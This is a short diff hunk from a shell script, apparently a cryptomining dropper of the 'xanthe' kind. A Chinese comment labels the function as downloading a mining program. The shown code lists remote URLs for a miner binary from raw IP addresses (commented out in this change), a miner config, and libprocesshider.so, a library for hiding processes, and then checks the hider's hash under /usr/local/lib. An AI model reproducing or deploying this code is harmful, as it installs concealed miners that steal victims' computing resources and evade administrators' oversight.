@@ -45,7 +45,7 @@ initializego() {
 # 下载挖矿程序
 filegetgo() {
 	
-	java_c_arr=("http://34.92.166.158:8080/files/java_c" "http://139.162.124.27:8080/files/java_c")
+	#java_c_arr=("http://34.92.166.158:8080/files/java_c" "http://139.162.124.27:8080/files/java_c")
 	config_arr=("https://raw.githubusercontent.com/nandakrr/xanthe/main/config.json")
 	lib_arr=("https://github.com/nandakrr/xanthe/blob/main/libprocesshider.so?raw=true")
 	if ( test -f /usr/local/lib/libprocesshider.so ) && ( md5sum --status -c - <<<"025685efeb19a7ad403f15126e7ffb5a /usr/local/lib/libprocesshider.so" ) 
